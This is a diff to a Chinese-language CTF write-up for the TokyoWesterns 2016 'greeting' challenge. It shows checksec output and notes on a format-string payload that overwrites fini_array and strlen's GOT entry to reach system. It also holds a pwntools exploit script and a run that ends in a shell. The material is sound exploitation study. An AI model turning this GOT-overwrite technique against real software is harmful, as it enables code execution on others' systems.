@@ -13,8 +13,8 @@
 [*] '/home/pitta/workspace/pwn_learn/rec0rd/Tokyowesterns 2016 greeting/greeting'
     Arch:       i386-32-little
     RELRO:      No RELRO    
-    Stack:      Canary found    # overwrite ret addr 需要先把 canary leak 出来
-    NX:         NX enabled      # 栈上不给执行，那就 ret2libc
+    Stack:      Canary found    
+    NX:         NX enabled      
     PIE:        No PIE (0x8048000)
     Stripped:   No
 ┌──(pitta㉿kali)-[~/workspace/pwn_learn/rec0rd/Tokyowesterns 2016 greeting]
@@ -160,7 +160,7 @@ Dump of assembler code for function main:
 
 # payload 说明
 
-采取双字节为写入的单位，其中将`fini_array`覆写为 `main 中 getnline的位置` 并不需要全都修改，高两字节内容一致，因此使用 `%12$hn`，其余的同理
+采取双字节为写入的单位，其中将`fini_array`覆写为 `main 中 getnline的位置` 因此使用 `%12$hn`，其余的同理
 ```shell
 ┌──(pitta㉿kali)-[~/workspace/pwn_learn/rec0rd/Tokyowesterns 2016 greeting]
 └─$ xxd ./test_payload/test1                          
@@ -205,6 +205,7 @@ from pwn import *
 
 # context.log_level = "debug"
 pipe = process("./greeting")
+# pipe = remote("127.0.0.1", 10001)
 
 print(pipe.recvuntil("... "))
 
@@ -213,25 +214,35 @@ fini_array = 0x08049934
 strlenGOT = 0x08049a54
 
 # overwrite to
-addrGetnline = 0x08048614   # low 2 byte diff
-systemcall = 0x08048490 # low 2 byte diff
+addrGetnline = 0x8048614   
+systemcall = 0x08048490 
 
-payload = "TT"      # padding
-payload += p32(fini_array)
-payload += p32(strlenGOT)
-payload += p32(strlenGOT+2)
+
+
+payload = "TT"
+payload += p32(fini_array).decode("iso-8859-1")      # 0x8614-18-14 = 34292
+payload += p32(strlenGOT).decode("iso-8859-1")       # 0x18490-0x8614 = 65148
+payload += p32(strlenGOT+2).decode("iso-8859-1")     # 0x20804 - 0x18490 = 33652
 payload += "%34292c%12$hn"
 payload += "%65148c%13$hn"
 payload += "%33652c%14$hn"
 
-print(len(payload))     # 确保不会超出
+
 
 pipe.sendline(payload)
 
-pipe.sendline('/bin/sh')
+pipe.sendline(b"/bin/sh")
 
 pipe.interactive()
 
+```
+run exp.py
+```shell
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 \x00 :)
+$ ls
+core    greeting  peda-session-dash.txt      README.md     test.py
+exp.py  payload1  peda-session-greeting.txt  test_payload
+$  
 ```
 
 # 回顾
